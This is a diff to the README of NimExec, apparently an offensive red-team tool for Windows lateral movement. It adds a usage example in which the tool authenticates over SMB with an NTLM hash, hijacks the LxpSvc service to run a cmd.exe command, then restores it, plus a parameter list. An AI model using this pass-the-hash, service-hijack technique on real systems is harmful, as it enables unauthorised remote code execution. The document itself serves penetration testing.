@@ -20,28 +20,53 @@ Also, you can install the required Nim modules via Nimble with the following com
 ```
 nimble install ptr_math nimcrypto hostname
 ```
-
 # Usage
+```
+test@ubuntu:~/Desktop/NimExec$ ./NimExec -u testuser -d TESTLABS -h 123abcbde966780cef8d9ec24523acac -t 10.200.2.2 -c 'cmd.exe /c "echo test > C:\Users\Public\test.txt"' -v
+ 
+                                                                                             _..._     
+                                                                                          .-'_..._''.  
+   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\ 
+ .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'            
+.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '              
+|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |              
+|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |              
+|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '              
+|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          . 
+|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/ 
+|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /  
+|  |   |  |                                        .'   /    `.   `.                               `   
+'--'   '--'                                       '----'       '----'                                  
+
+                                            @R0h1rr1m          
+
+
+[+] Connected to 10.200.2.2:445
+[+] NTLM Authentication with Hash is succesfull!
+[+] Connected to IPC Share of target!
+[+] Opened a handle for svcctl pipe!
+[+] Bound to the RPC Interface!
+[+] RPC Binding is acknowledged!
+[+] SCManager handle is obtained!
+[+] Number of obtained services: 265
+[+] Selected service is LxpSvc
+[+] Service: LxpSvc is opened!
+[+] Previous Service Path is: C:\Windows\system32\svchost.exe -k netsvcs
+[+] Service config is changed!
+[!] StartServiceW Return Value: 1053 (ERROR_SERVICE_REQUEST_TIMEOUT)
+[+] Service start request is sent!
+[+] Service config is restored!
+[+] Service handle is closed!
+[+] Service Manager handle is closed!
+[+] SMB is closed!
+[+] Tree is disconnected!
+[+] Session logoff!
+```
+
+It's tested against Windows 10&11, Windows Server 16&19&22 from Ubuntu 20.04 and Windows 10 machines.
+# Command Line Parameters
 
 ``` 
-                                                                                          _..._
-                                                                                          .-'_..._''.
-   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
- .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
-.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
-|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
-|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
-|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
-|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
-|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
-|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
-|  |   |  |                                        .'   /    `.   `.                               `
-'--'   '--'                                       '----'       '----'
-
-                                            @R0h1rr1m
-
-
-
     -v | --verbose                          Enable more verbose output.
     -u | --username <Username>              Username for NTLM Authentication.*
     -h | --hash <NTLM Hash>                 NTLM password hash for NTLM Authentication.*
@@ -52,7 +77,6 @@ nimble install ptr_math nimcrypto hostname
     --help                                  Show the help message.
 
 ```
-
 
 # References
 
